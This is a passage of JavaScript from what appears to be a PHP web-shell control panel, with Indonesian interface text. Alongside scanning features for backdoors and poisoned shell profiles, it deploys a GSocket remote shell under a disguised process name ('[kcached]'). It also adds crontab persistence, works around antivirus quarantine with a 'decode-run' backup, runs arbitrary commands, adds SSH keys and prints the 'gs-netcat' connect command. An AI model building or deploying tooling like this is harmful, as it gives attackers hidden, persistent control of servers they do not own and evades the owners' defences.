                                if (hintEl) hintEl.innerHTML = '&#9888; Koneksi terputus setelah <strong>' + elapsed2 + 's</strong> &mdash; <strong>' + threatTotal + ' ancaman</strong> ditemukan sejauh ini. <br><em>Pilih 1 domain dari dropdown untuk scan lengkap tanpa timeout.</em>';
                                log('⚠ Connection closed before scan finished (' + elapsed2 + 's) — ' + threatTotal + ' threat(s) found so far');
                            }
                            return;
                        }
                        buffer += decoder.decode(result.value, { stream: true });
                        var lines = buffer.split('\n');
                        buffer = lines.pop();
                        lines.forEach(processLine);
                        return readChunk();
                    });
                }
                return readChunk();
            }).catch(function (e) {
                clearInterval(_scanTimer); _scanTimer = null;
                var elapsedErr = Math.round((Date.now() - startTime) / 1000);
                if (typeof btnEl !== 'undefined' && btnEl) { btnEl.disabled = false; btnEl.style.opacity = '1'; }
                var lw = document.getElementById('scan-live-wrap');
                if (lw) lw.parentNode.removeChild(lw);
                if (threatTotal > 0) {
                    if (typeof hintEl !== 'undefined' && hintEl) hintEl.innerHTML = '&#9888; Koneksi terputus setelah <strong>' + elapsedErr + 's</strong> &mdash; <strong>' + threatTotal + ' ancaman</strong> ditemukan sejauh ini. <br><em>Pilih 1 domain dari dropdown untuk scan lengkap.</em>';
                    log('⚠ Connection lost after ' + elapsedErr + 's — ' + threatTotal + ' threat(s) found before disconnect');
                } else {
                    if (typeof hintEl !== 'undefined' && hintEl) hintEl.innerHTML = '&#9888; Scan error: ' + e.message + ' <br><em>Coba pilih 1 domain untuk scan lebih cepat.</em>';
                    log('ERR: ' + e.message);
                }
            });
        }
        function sBd() {
            document.getElementById('bt').textContent = ''; var tr = E('tr'), td = E('td'); td.colSpan = 4; td.className = 'ld pu'; td.textContent = 'Scanning...'; tr.appendChild(td); document.getElementById('bt').appendChild(tr);
            api('scan_backdoors', {}, function (d) {
                var tb = document.getElementById('bt'); tb.textContent = '';
                if (d.total === 0) { var tr = E('tr'), td = E('td'); td.colSpan = 4; td.style.textAlign = 'center'; td.style.padding = '20px'; td.style.color = 'var(--green)'; td.textContent = '✔ No backdoors found'; tr.appendChild(td); tb.appendChild(tr); }
                else d.threats.forEach(function (t) {
                    var tr = E('tr'); tr.className = 'th';
                    [t.path, t.type, t.size, ''].forEach(function (c, i) {
                        var td = E('td');
                        if (i === 1) {
                            var s = E('span'); s.className = 'tag tag-d'; s.textContent = c; td.appendChild(s);
                        } else if (i === 3) {
                            var bdDom = pathToDomain(t.path);
                            var bdUrl = bdDom ? buildUrl(bdDom, t.path) : null;
                            if (bdUrl) {
                                var ub = E('a'); ub.className = 'btn btn-s btn-g'; ub.style.cssText = 'margin-right:4px;text-decoration:none';
                                ub.textContent = '🔗 Open URL'; ub.href = bdUrl; ub.target = '_blank'; ub.title = bdUrl;
                                td.appendChild(ub);
                            }
                            var vb = E('button'); vb.className = 'btn btn-s btn-w'; vb.style.marginRight = '4px'; vb.textContent = '👁 View';
                            vb.onclick = (function (path) { return function () { viewFile(path, null) }; })(t.path);
                            td.appendChild(vb);
                            var eb = E('button'); eb.className = 'btn btn-s'; eb.style.cssText = 'margin-right:4px;background:var(--orange);color:#000'; eb.textContent = '✏️ Edit';
                            eb.onclick = (function (path) { return function () { editFile(path, null) }; })(t.path);
                            td.appendChild(eb);
                            var db = E('button'); db.className = 'btn btn-s btn-d'; db.textContent = '🗑 Delete';
                            db.onclick = (function (path, row) { return function () { if (confirm('Delete?\n\n' + path)) api('remove_file', { path: path }, function (d) { if (d.method === 'overwrite') log('Killed (overwrite): ' + path); else log('Deleted: ' + path); row.style.opacity = '0.3'; row.style.pointerEvents = 'none'; }) }; })(t.path, tr);
                            td.appendChild(db);
                        } else {
                            td.textContent = c;
                            if (i === 0) { td.style.fontFamily = 'monospace'; td.style.fontSize = '11px'; td.title = c; }
                        }
                        tr.appendChild(td);
                    });
                    tb.appendChild(tr);
                });
                log('Backdoors: ' + d.total);
            });
        }
        var _shieldHome = '';
        function editBashrc(name) {
            if (!_shieldHome) {
                api('detect_env', {}, function(d) {
                    _shieldHome = d.home || '';
                    if (_shieldHome) editFile(_shieldHome + '/' + name, function() { sBashrc(); });
                    else log('Cannot detect home directory');
                });
            } else {
                editFile(_shieldHome + '/' + name, function() { sBashrc(); });
            }
        }
        function sBashrc() {
            api('scan_bashrc', {}, function (d) {
                if (d.home) _shieldHome = d.home;
                var st = document.getElementById('bst'); st.textContent = '';
                var div = E('div');
                if (d.poisoned) { div.style.cssText = 'background:#ff453a1a;border:1px solid #ff453a33;border-radius:8px;padding:12px;color:var(--accent);font-weight:600'; div.textContent = '⚠ POISONED — ' + d.patterns.join(', '); document.getElementById('dv-b').textContent = 'POISON'; document.getElementById('dv-b').style.color = 'var(--accent)'; }
                else { div.style.cssText = 'background:#32d74b1a;border:1px solid #32d74b33;border-radius:8px;padding:12px;color:var(--green);font-weight:600'; div.textContent = '✔ CLEAN'; document.getElementById('dv-b').textContent = 'CLEAN'; document.getElementById('dv-b').style.color = 'var(--green)'; }
                // Show lock status badge
                var lockBadge = E('span'); lockBadge.style.cssText = 'margin-left:12px;font-size:11px;padding:2px 8px;border-radius:4px;' + (d.locked ? 'background:#1c4532;color:#34d399;border:1px solid #34d399' : 'background:var(--bg3);color:var(--t3);border:1px solid var(--border)'); lockBadge.textContent = d.locked ? '🔒 LOCKED (immutable)' : '🔓 Unlocked'; div.appendChild(lockBadge);
                st.appendChild(div);
                if (typeof d.content === 'object') {
                    var allContent = '';
                    for (var fname in d.content) { allContent += '=== ' + fname + ' ===\n' + d.content[fname] + '\n\n'; }
                    document.getElementById('brc').textContent = allContent;
                } else {
                    document.getElementById('brc').textContent = d.content;
                }
                log('Profile scan (' + (d.files_checked || ['.bashrc']).join(', ') + '): ' + (d.poisoned ? 'POISONED' : 'clean') + ' | ' + (d.locked ? '🔒 LOCKED' : '🔓 Unlocked'));
            });
        }
        var gsPort = '443', gsName = '[kcached]';
        function selPort(el) { gsPort = el.dataset.port; document.querySelectorAll('.gs-port').forEach(function (b) { b.classList.remove('active'); b.style.background = ''; b.style.color = 'var(--accent)'; b.style.borderColor = 'var(--accent)' }); el.classList.add('active'); el.style.background = 'var(--accent)'; el.style.color = '#fff'; }
        function selName(el) { gsName = el.dataset.name; document.querySelectorAll('.gs-name').forEach(function (b) { b.classList.remove('active'); b.style.background = ''; b.style.color = 'var(--accent)'; b.style.borderColor = 'var(--accent)' }); el.classList.add('active'); el.style.background = 'var(--accent)'; el.style.color = '#fff'; }
        (function () { document.querySelectorAll('.gs-port.active,.gs-name.active').forEach(function (el) { el.style.background = 'var(--accent)'; el.style.color = '#fff' }) })();
        function sGs() {
            api('gsocket_status', {}, function (d) {
                var st = document.getElementById('gs-status'); st.textContent = '';
                var cn = document.getElementById('gs-connect'); cn.style.display = 'none'; cn.textContent = '';
                var div = E('div');
                if (d.installed) {
                    var quar = d.quarantined;
                    div.style.cssText = quar ? 'background:#ff9f0a1a;border:1px solid #ff9f0a33;border-radius:8px;padding:16px' : 'background:#32d74b1a;border:1px solid #32d74b33;border-radius:8px;padding:16px';
                    var h = E('div'); h.style.cssText = quar ? 'color:var(--orange);font-weight:600;margin-bottom:8px' : 'color:var(--green);font-weight:600;margin-bottom:8px'; h.textContent = quar ? '⚠ Binary Quarantined (backup available — click Start to decode-run)' : '✔ GSocket Installed'; div.appendChild(h);
                    var info = [['Binary', quar ? 'REMOVED by Imunify360' : (esc(d.size) + ' bytes')], ['Path', d.bin_path || d.bin_dir || '-'], ['Secret', d.secret], ['Port', d.port || '443'], ['Daemon', d.running ? (d.proc_count || 1) + ' proc(s) running' : 'Stopped'], ['Crontab', d.crontab ? '✔ Active' : '✘ None'], ['Lock', d.lock ? '🔒 LOCKED' : '🔓 Off']];
                    // Pre-fill secret in lock section
                    if (d.secret) { var lsf = document.getElementById('gs-lock-secret'); if (lsf && !lsf.value) lsf.value = d.secret; }
                    // Update lock badge
                    var lb = document.getElementById('lock-badge');
                    if (lb) { lb.textContent = d.lock ? '🔒 LOCKED' : '🔓 Off'; lb.style.color = d.lock ? 'var(--orange)' : 'var(--t3)'; lb.style.background = d.lock ? 'rgba(255,159,10,0.15)' : 'var(--bg3)'; }
                    info.forEach(function (i) { var row = E('div'); row.style.cssText = 'color:var(--t2);font-size:12px;margin-bottom:2px'; var lbl = E('span'); lbl.style.cssText = 'color:var(--t3);display:inline-block;width:100px'; lbl.textContent = i[0] + ':'; var val = E('span'); if (i[0] === 'Secret') { val.style.cssText = 'color:var(--orange);font-family:monospace;font-weight:600'; val.textContent = i[1] } else if (i[0] === 'Daemon') { val.style.color = d.running ? 'var(--green)' : 'var(--accent)'; val.textContent = i[1] } else { val.textContent = i[1] } row.appendChild(lbl); row.appendChild(val); div.appendChild(row) });
                    if (d.secret) {
                        cn.style.display = 'block';
                        var cd = E('div'); cd.style.cssText = 'background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px';
                        var cl = E('div'); cl.style.cssText = 'color:var(--t3);font-size:10px;margin-bottom:6px'; cl.textContent = 'Connect from WSL/Linux:'; cd.appendChild(cl);
                        var cc = E('div'); cc.style.cssText = 'display:flex;align-items:center;gap:8px';
                        var code = E('code'); code.style.cssText = 'flex:1;color:var(--green);font-size:12px;word-break:break-all';
                        var connectCmd = (d.port && d.port !== '443' ? 'GS_PORT=' + d.port + ' ' : '') + 'gs-netcat -s "' + d.secret + '" -i';
                        code.textContent = connectCmd; cc.appendChild(code);
                        var cpb = E('button'); cpb.className = 'btn btn-s btn-ok'; cpb.textContent = 'Copy'; cpb.onclick = function () { navigator.clipboard.writeText(connectCmd).then(function () { log('Copied!') }).catch(function () { }) }; cc.appendChild(cpb);
                        cd.appendChild(cc); cn.appendChild(cd);
                    }
                    document.getElementById('dv-g').textContent = d.running ? 'ON' : 'OFF'; document.getElementById('dv-g').style.color = d.running ? 'var(--green)' : 'var(--accent)';
                } else {
                    div.style.cssText = 'background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:16px';
                    var t = E('div'); t.style.cssText = 'color:var(--t3);font-weight:600'; t.textContent = '○ Not Installed'; div.appendChild(t);
                    var s = E('div'); s.style.cssText = 'color:var(--t3);font-size:12px;margin-top:4px'; s.textContent = 'Use the form below to deploy'; div.appendChild(s);
                    document.getElementById('dv-g').textContent = 'OFF'; document.getElementById('dv-g').style.color = 'var(--t3)';
                }
                st.appendChild(div);
            });
        }
        function installGs() {
            var secret = document.getElementById('gs-secret').value.trim();
            if (secret.length < 8) { alert('Secret must be at least 8 characters'); return; }
            if (!confirm('Deploy GSocket?\n\nSecret: ' + secret + '\nPort: ' + gsPort + '\nHidden: ' + gsName)) return;
            log('Deploying GSocket (port:' + gsPort + ', hidden:' + gsName + ')...');
            api('install_gsocket', { secret: secret, port: gsPort, hidden_name: gsName }, function (d) {
                if (d.ok) {
                    log('✔ GSocket deployed!');
                    if (d.steps) d.steps.forEach(function (s) { log('  ' + s) });
                    if (d.connect_cmd) log('▸ Connect: ' + d.connect_cmd);
                    sGs();
                } else {
                    log('✘ FAILED: ' + (d.error || 'all methods failed'));
                    if (d.steps) d.steps.forEach(function (s) { log('  ' + s) });
                }
            }, null, 120000);
        }
        function autoDeploy() {
            if (!confirm('Auto Deploy GSocket?\n\nAuto-detect: OS, path, port, arch\nRandom secret key\n3-method fallback\n\nProceed?')) return;
            var btn = document.getElementById('btn-auto');
            btn.disabled = true; btn.textContent = '⏳ Deploying... (this takes 30-60s)'; btn.style.opacity = '0.6';
            log('⏳ AUTO DEPLOY started...');
            log('  Auto-detecting OS, path, port, arch...');
            api('auto_deploy', {}, function (d) {
                btn.disabled = false; btn.textContent = '⚡ AUTO DEPLOY GSOCKET'; btn.style.opacity = '1';
                if (d.ok) {
                    log('✔ AUTO DEPLOY SUCCESS!');
                    if (d.steps) d.steps.forEach(function (s) { log('  ' + s) });
                    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
                    log('▸ Secret: ' + d.secret);
                    log('▸ Port: ' + d.port);
                    log('▸ Dir: ' + d.dir);
                    log('▸ Hidden: ' + d.hidden_name);
                    log('▸ Connect: ' + d.connect_cmd);
                    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
                    sGs();
                } else {
                    log('✘ AUTO DEPLOY FAILED: ' + (d.error || 'unknown'));
                    if (d.steps) d.steps.forEach(function (s) { log('  ' + s) });
                    log('Tip: Try Manual Deploy or check logs above for details.');
                }
            }, function(e) { btn.disabled = false; btn.textContent = '⚡ AUTO DEPLOY GSOCKET'; btn.style.opacity = '1'; }, 120000);
        }
        var gsLockInterval = 5;
        function selInterval(el) {
            gsLockInterval = parseInt(el.dataset.v);
            document.querySelectorAll('.lk-itv').forEach(function(b){ b.classList.remove('active'); b.style.background='transparent'; b.style.color='var(--accent)'; b.style.borderColor='var(--accent)'; });
            el.classList.add('active'); el.style.background='var(--accent)'; el.style.color='#fff'; el.style.borderColor='var(--accent)';
        }
        (function(){ document.querySelectorAll('.lk-itv.active').forEach(function(el){ el.style.background='var(--accent)'; el.style.color='#fff'; el.style.borderColor='var(--accent)'; }); })();
        function gsDeployLock() {
            var secret = document.getElementById('gs-lock-secret').value.trim();
            var port = document.getElementById('gs-lock-port').value;
            var msg = 'Aktifkan persistence?\n\nInterval: */' + gsLockInterval + ' * * * *\nPort: ' + port + (secret ? '\nSecret: ' + secret : '\nSecret: auto-generate');
            if (!confirm(msg)) return;
            log('🔒 Installing persistence (crontab)...');
            var lr = document.getElementById('lock-result'); lr.style.display='block'; lr.textContent = 'Installing...';
            api('gsocket_lock', {secret: secret, port: port, interval: gsLockInterval}, function(d) {
                if (d.ok) {
                    log('✔ Crontab installed! gs-netcat akan start dalam ' + (d.wait_minutes || gsLockInterval) + ' menit...');
                    if (d.results) d.results.forEach(function(r){ log('  ' + r); });
                    if (d.secret) { log('▸ Secret: ' + d.secret); document.getElementById('gs-lock-secret').value = d.secret; }
                    if (d.connect_cmd) log('▸ Connect: ' + d.connect_cmd);
                    lr.textContent = (d.results ? d.results.join('\n') : 'OK') + '\n⏳ Tunggu ' + (d.wait_minutes || gsLockInterval) + ' menit untuk cron start daemon';
                    lr.style.color = 'var(--green)';
                } else {
                    log('✘ Lock gagal: ' + (d.error || 'unknown'));
                    lr.textContent = '✘ ' + (d.error || 'unknown'); lr.style.color = 'var(--accent)';
                }
                sGs();
            }, null, 30000);
        }
        function gsUnlock() {
            if (!confirm('Hapus semua persistence GSocket?\n(crontab)')) return;
            log('🔓 Removing persistence...');
            api('gsocket_unlock', {}, function(d) {
                log(d.ok ? '✔ ' + d.message : '✘ Failed');
                var lr = document.getElementById('lock-result'); lr.style.display='block';
                lr.textContent = d.message || (d.ok ? 'Unlocked' : 'Failed'); lr.style.color = d.ok ? 'var(--t2)' : 'var(--accent)';
                sGs();
            });
        }
        function detectEnv() {
            log('Detecting environment...');
            api('detect_env', {}, function (d) {
                var env = document.getElementById('gs-env'); env.style.display = 'block'; env.textContent = '';
                var div = E('div'); div.style.cssText = 'background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px';
                var title = E('div'); title.style.cssText = 'color:var(--orange);font-weight:600;font-size:12px;margin-bottom:8px'; title.textContent = 'Environment Detection'; div.appendChild(title);
                var info = [['OS', d.os + ' (' + d.os_detail + ')'], ['Home', d.home], ['User', d.user], ['PHP', d.php], ['Server', d.server]];
                if (d.arch) info.push(['Arch', d.arch]);
                if (d.best_dir) info.push(['Best Dir', d.best_dir]);
                if (d.best_port) info.push(['Best Port', d.best_port]);
                if (d.ports) info.push(['Open Ports', d.ports.join(', ')]);
                if (d.domains) info.push(['Domains', '(' + d.domains.length + ') ' + d.domains.slice(0, 5).join(', ')]);
                if (d.gsocket_supported === false) info.push(['GSocket', 'NOT SUPPORTED (' + d.note + ')']);
                info.forEach(function (i) {
                    var row = E('div'); row.style.cssText = 'font-size:11px;margin-bottom:2px';
                    var lbl = E('span'); lbl.style.cssText = 'color:var(--t3);display:inline-block;width:90px'; lbl.textContent = i[0] + ':';
                    var val = E('span'); val.style.cssText = 'color:var(--t2);font-family:monospace'; val.textContent = i[1];
                    row.appendChild(lbl); row.appendChild(val); div.appendChild(row);
                });
                if (d.writable_dirs && d.writable_dirs.length > 0) {
                    var wt = E('div'); wt.style.cssText = 'font-size:11px;margin-top:6px;color:var(--t3)'; wt.textContent = 'Writable dirs:'; div.appendChild(wt);
                    d.writable_dirs.forEach(function (wd) {
                        var row = E('div'); row.style.cssText = 'font-size:10px;margin-left:12px;color:var(--t2);font-family:monospace';
                        row.textContent = (typeof wd === 'object' ? (wd.path + (wd.exec ? ' ✔ exec' : ' ✘ noexec')) : wd);
                        div.appendChild(row);
                    });
                }
                env.appendChild(div);
                log('Environment: ' + d.os + ' | Home: ' + d.home + ' | Dir: ' + (d.best_dir || '?') + ' | Port: ' + (d.best_port || '?'));
            });
        }
        document.getElementById('tc').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') {
                var cmd = this.value.trim(); if (!cmd) return; this.value = '';
                var out = document.getElementById('to');
                var line = document.createTextNode(cmd + '\n'); out.appendChild(line);
                api('run_cmd', { cmd: cmd }, function (d) {
                    var txt = document.createTextNode((d.output || '') + '\n<?= htmlspecialchars($user) ?>@<?= htmlspecialchars(gethostname()) ?>:~$ ');
                    out.appendChild(txt); out.scrollTop = out.scrollHeight;
                });
            }
        });
        function sshScan() {
            document.getElementById('ssh-status').textContent = 'Scanning...';
            document.getElementById('ssh-keys').innerHTML = '';
            document.getElementById('ssh-files').innerHTML = '';
            document.getElementById('ssh-elf-warn').innerHTML = '';
            api('scan_ssh', {}, function (d) {
                var st = document.getElementById('ssh-status');
                if (!d.ssh_exists) { st.innerHTML = '<span style="color:var(--y)">No .ssh directory found</span>'; return; }
                st.innerHTML = '<span style="color:var(--t3)">Dir: ' + d.ssh_dir + '</span> &mdash; <span style="color:var(--g)">' + d.total_keys + ' keys</span>' + (d.threat_keys > 0 ? ' &mdash; <span style="color:var(--r)">' + d.threat_keys + ' unknown</span>' : ' &mdash; <span style="color:var(--g)">all known services</span>');
                window._sshDir = d.ssh_dir;
                // ELF threats in .ssh/
                var elfDiv = document.getElementById('ssh-elf-warn');
                if (d.elf_threats && d.elf_threats.length > 0) {
                    d.elf_threats.forEach(function (t) {
                        var w = E('div'); w.style.cssText = 'background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);border-radius:8px;padding:10px;margin-bottom:8px;font-size:12px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px';
                        var info = E('div');
                        info.innerHTML = '<span style="color:var(--r);font-weight:600">&#9888; ELF Binary in .ssh/</span><br><span style="color:var(--t2);font-family:monospace;font-size:11px">' + esc(t.path) + '</span> (' + t.size + ' bytes) — <span style="color:var(--r)">Possible GSocket disguised as SSH key!</span>';
                        w.appendChild(info);
                        var acts = E('div'); acts.style.cssText = 'display:flex;gap:4px;flex-shrink:0';
                        var vb = E('button'); vb.className = 'btn btn-s btn-w'; vb.style.cssText = 'font-size:10px;padding:3px 8px'; vb.textContent = '👁 View';
                        vb.onclick = (function(p){return function(){viewFile(p,function(){sshScan()})}})(t.path);
                        acts.appendChild(vb);
                        var db = E('button'); db.className = 'btn btn-s btn-d'; db.style.cssText = 'font-size:10px;padding:3px 8px'; db.textContent = '🗑 Delete';
                        db.onclick = (function(p,row){return function(){if(confirm('Delete ELF binary?\n\n'+p)){api('remove_file',{path:p},function(d2){if(d2.ok){log('Deleted: '+p);row.style.opacity='0.3';row.style.pointerEvents='none'}else{alert(d2.error||'Delete failed')}})}}})(t.path,w);
                        acts.appendChild(db);
                        var dfb = E('button'); dfb.className = 'btn btn-s'; dfb.style.cssText = 'font-size:10px;padding:3px 8px;background:#8b0000'; dfb.textContent = '💀 Delete Folder';
                        dfb.onclick = (function(p,row){var dir=p.substring(0,p.lastIndexOf('/'));return function(){if(confirm('Delete ENTIRE folder?\n\n'+dir+'\n\nThis removes the folder and ALL files inside.')){api('run_cmd',{cmd:'rm -rf '+dir},function(){log('Deleted folder: '+dir);row.style.opacity='0.3';row.style.pointerEvents='none';sshScan()})}}})(t.path,w);
                        acts.appendChild(dfb);
                        w.appendChild(acts);
                        elfDiv.appendChild(w);
                    });
                }
                // Files
                var fb = document.getElementById('ssh-files');
                fb.innerHTML = '<div style="font-size:11px;color:var(--t3);margin-bottom:4px;font-weight:600">Files in .ssh/</div>';
                d.files.forEach(function (f) {
                    var row = E('div'); row.style.cssText = 'display:flex;justify-content:space-between;padding:4px 0;font-size:11px;border-bottom:1px solid var(--b2)';
                    row.innerHTML = '<span style="color:var(--t2);font-family:monospace">' + f.name + '</span><span style="color:var(--t3)">' + f.perm + ' &middot; ' + f.size + 'B &middot; ' + f.mod + '</span>';
                    fb.appendChild(row);
                });
                // Keys
                var kb = document.getElementById('ssh-keys');
                kb.innerHTML = '<div style="font-size:11px;color:var(--t3);margin-bottom:6px;font-weight:600">authorized_keys (' + d.total_keys + ' keys)</div>';
                if (!d.keys.length) { kb.innerHTML += '<div style="color:var(--t3);font-size:12px">No keys found</div>'; return; }
                window._sshKeys = d.keys;
                d.keys.forEach(function (k) {
                    if (k.type === 'comment') return;
                    var row = E('div'); row.style.cssText = 'display:flex;align-items:center;justify-content:space-between;padding:8px 10px;margin-bottom:4px;border-radius:8px;font-size:11px;background:' + (k.threat ? 'rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2)' : 'rgba(255,255,255,0.03);border:1px solid var(--b2)');
                    var info = E('div');
                    var label = E('span'); label.style.cssText = 'color:' + (k.threat ? 'var(--r)' : 'var(--g)') + ';font-weight:600'; label.textContent = (k.known_service ? '✅ ' : '⚠ ') + k.comment; info.appendChild(label);
                    var meta = E('div'); meta.style.cssText = 'color:var(--t3);font-size:10px;margin-top:2px'; meta.textContent = k.key_type + ' · ' + k.length + ' chars · #' + k.fingerprint; info.appendChild(meta);
                    var acts = E('div'); acts.style.cssText = 'display:flex;gap:4px;flex-shrink:0';
                    var eb = E('button'); eb.className = 'btn btn-s'; eb.style.cssText = 'font-size:10px;padding:2px 8px;background:rgba(255,159,10,0.15);color:var(--orange)'; eb.textContent = '✏ Edit';
                    eb.onclick = (function (idx, keyData) { return function () { sshEditOpen(idx, keyData); }; })(k.idx, k);
                    acts.appendChild(eb);
                    var dlb = E('button'); dlb.className = 'btn btn-s'; dlb.style.cssText = 'font-size:10px;padding:2px 8px;background:rgba(50,215,75,0.15);color:var(--g)'; dlb.textContent = '⬇ Download';
                    dlb.onclick = (function (idx, comment) { return function () { sshDownload(idx, comment); }; })(k.idx, k.comment);
                    acts.appendChild(dlb);
                    var rb = E('button'); rb.className = 'btn btn-s'; rb.style.cssText = 'font-size:10px;padding:2px 8px;background:rgba(239,68,68,0.15);color:var(--r)'; rb.textContent = '🗑 Remove';
                    rb.onclick = (function (idx) { return function () { sshRemove(idx); }; })(k.idx);
                    acts.appendChild(rb);
                    row.appendChild(info); row.appendChild(acts);
                    kb.appendChild(row);
                });
            });
        }
        function sshRemove(idx) {
            if (!confirm('Remove this SSH key?')) return;
            api('ssh_remove_key', { key_idx: idx }, function () { sshScan(); });
        }
        function sshEditOpen(idx, keyData) {
            var modal = document.getElementById('ssh-edit-modal');
            modal.style.display = 'flex';
            document.getElementById('ssh-edit-info').textContent = 'Key #' + idx + ' — ' + (keyData.key_type || '') + ' — ' + (keyData.comment || 'unknown');
            window._sshEditIdx = idx;
            api('read_file', { path: (window._sshDir || '') + '/authorized_keys' }, function (d) {
                if (d.content) {
                    var lines = d.content.split('\n');
                    document.getElementById('ssh-edit-val').value = lines[idx] || '';
                }
            });
        }
        function sshEditClose() { document.getElementById('ssh-edit-modal').style.display = 'none'; }
        function sshEditSave() {
            var val = document.getElementById('ssh-edit-val').value.trim();
            if (!val) { alert('Key cannot be empty'); return; }
            api('ssh_edit_key', { key_idx: window._sshEditIdx, new_value: val }, function (d) {
                if (d.ok === false) { alert(d.error); return; }
                sshEditClose(); sshScan();
            });
        }
        function sshDownload(idx, comment) {
            api('read_file', { path: (window._sshDir || '') + '/authorized_keys' }, function (d) {
                if (!d.content) return;
                var lines = d.content.split('\n');
                var key = lines[idx] || '';
                var blob = new Blob([key + '\n'], { type: 'text/plain' });
                var a = E('a'); a.href = URL.createObjectURL(blob);
                a.download = (comment || 'key_' + idx).replace(/[^a-zA-Z0-9_.-]/g, '_') + '.pub';
                document.body.appendChild(a); a.click(); document.body.removeChild(a);
            });
        }
        function sshAdd() {
            var key = document.getElementById('ssh-newkey').value.trim();
            if (!key) return;
            api('ssh_add_key', { new_key: key }, function () { document.getElementById('ssh-newkey').value = ''; sshScan(); });
        }
        function sInfo() {
            document.getElementById('ib').textContent = 'Loading...';
            api('server_info', {}, function (d) {
                var ib = document.getElementById('ib'); ib.textContent = '';
                [['Hostname', 'hostname'], ['OS', 'os'], ['User', 'user'], ['PHP', 'php'], ['Server', 'server'], ['Server IP', 'ip'], ['Your IP', 'remote'], ['Home', 'home'], ['Disk Free', 'disk_free'], ['Disk Total', 'disk_total'], ['Memory', 'memory'], ['Disabled', 'disabled']].forEach(function (f) {
                    var row = E('div'); row.className = 'ir';
                    var lbl = E('div'); lbl.className = 'il'; lbl.textContent = f[0];
                    var val = E('div'); val.className = 'iv'; val.textContent = d.info[f[1]] || '-';
                    row.appendChild(lbl); row.appendChild(val); ib.appendChild(row);
                });
            });
        }
        var _editPath = '', _editAfterFn = null;
        function editFile(path, afterFn) {
            _editPath = path;
            _editAfterFn = afterFn || null;
            var ov = document.getElementById('fe-overlay');
            document.getElementById('fe-title').textContent = path.split('/').pop();
            document.getElementById('fe-path').textContent = path;
            document.getElementById('fe-meta').textContent = '';
            document.getElementById('fe-status').textContent = 'Loading...';
            document.getElementById('fe-status').style.color = 'var(--t3)';
            document.getElementById('fe-body').value = '';
            document.getElementById('fe-save').disabled = true;
            ov.style.display = 'flex';
            api('read_file', { path: path }, function (d) {
                if (d.ok === false) {
                    document.getElementById('fe-body').value = '// ERROR: ' + (d.error || 'Cannot read file');
                    document.getElementById('fe-status').textContent = '⚠ ' + (d.error || 'Read failed');
                    document.getElementById('fe-status').style.color = 'var(--accent)';
                    return;
                }
                document.getElementById('fe-body').value = d.content || '';
                document.getElementById('fe-meta').textContent = Math.round(d.size / 1024 * 10) / 10 + ' KB  |  ' + (d.mod || '');
                document.getElementById('fe-save').disabled = false;
                // Show suspicious lines warning
                var wx = document.getElementById('fe-warn');
                if (wx) wx.parentNode.removeChild(wx);
                if (d.suspicious_lines && d.suspicious_lines.length > 0) {
                    var wdiv = E('div'); wdiv.id = 'fe-warn';
                    wdiv.style.cssText = 'background:#ff453a11;border-bottom:1px solid #ff453a33;padding:8px 16px;flex-shrink:0';
                    var wtitle = E('span'); wtitle.style.cssText = 'color:var(--accent);font-weight:600;font-size:11px';
                    wtitle.textContent = '⚠ Suspicious code detected — ' + d.suspicious_lines.length + ' line(s):';
                    wdiv.appendChild(wtitle);
                    var wlist = E('div'); wlist.style.cssText = 'margin-top:5px;display:flex;flex-wrap:wrap;gap:5px';
                    d.suspicious_lines.forEach(function (sl) {
                        var chip = E('button'); chip.className = 'btn btn-s btn-d';
                        chip.style.cssText = 'font-size:10px;padding:2px 8px;background:#ff453a33;border:1px solid var(--accent)';
                        chip.title = sl.pattern + ': ' + sl.snippet;
                        chip.textContent = 'Line ' + sl.line + ' [' + sl.pattern + ']';
                        chip.onclick = (function (ln) { return function () { jumpToEditorLine(ln) }; })(sl.line);
                        wlist.appendChild(chip);
                    });
                    wdiv.appendChild(wlist);
                    var ta = document.getElementById('fe-body');
                    ta.parentNode.insertBefore(wdiv, ta);
                    document.getElementById('fe-status').textContent = '⚠ ' + d.suspicious_lines.length + ' suspicious line(s) found — click line badges to jump';
                    document.getElementById('fe-status').style.color = 'var(--accent)';
                    jumpToEditorLine(d.suspicious_lines[0].line);
                } else {
                    document.getElementById('fe-status').textContent = '✔ No obvious injection detected — ' + d.size + ' bytes loaded';
                    document.getElementById('fe-status').style.color = 'var(--green)';
                }
                log('Editing: ' + path + (d.suspicious_lines && d.suspicious_lines.length ? ' ⚠ ' + d.suspicious_lines.length + ' suspicious line(s)' : ' ✔ clean'));
            }, function () {
                document.getElementById('fe-body').value = '// ERROR: Request timeout. Close and try again.';
                document.getElementById('fe-status').textContent = '⚠ Timeout — close and retry';
                document.getElementById('fe-status').style.color = 'var(--accent)';
            });
        }
        function saveFile() {
            if (!_editPath) return;
            var content = document.getElementById('fe-body').value;
            var btn = document.getElementById('fe-save');
            btn.disabled = true; btn.textContent = '⏳ Saving...';
            document.getElementById('fe-status').textContent = 'Saving...';
            document.getElementById('fe-status').style.color = 'var(--orange)';
            api('save_file', { path: _editPath, content: content }, function (d) {
                btn.disabled = false; btn.textContent = '💾 Save File';
                if (d.ok) {
                    document.getElementById('fe-status').textContent = '✔ Saved — ' + d.size + ' bytes written. Backup: ' + (d.backup || 'n/a');
                    document.getElementById('fe-status').style.color = 'var(--green)';
                    log('✔ Saved: ' + _editPath + ' (' + d.size + ' bytes)');
                    if (_editAfterFn) setTimeout(_editAfterFn, 500);
                } else {
                    document.getElementById('fe-status').textContent = '✘ Save failed: ' + (d.error || 'unknown error');
                    document.getElementById('fe-status').style.color = 'var(--accent)';
                    log('✘ Save failed: ' + _editPath);
                }
            });
        }
        function closeEditor() {
            document.getElementById('fe-overlay').style.display = 'none';
            document.getElementById('fe-body').value = '';
            _editPath = '';
        }
        document.getElementById('fe-overlay').addEventListener('click', function (e) {
            if (e.target === this) closeEditor();
        });
        document.getElementById('fe-body').addEventListener('keydown', function (e) {
            if (e.key === 'Tab') {
                e.preventDefault();
                var s = this.selectionStart, en = this.selectionEnd;
                this.value = this.value.substring(0, s) + '    ' + this.value.substring(en);
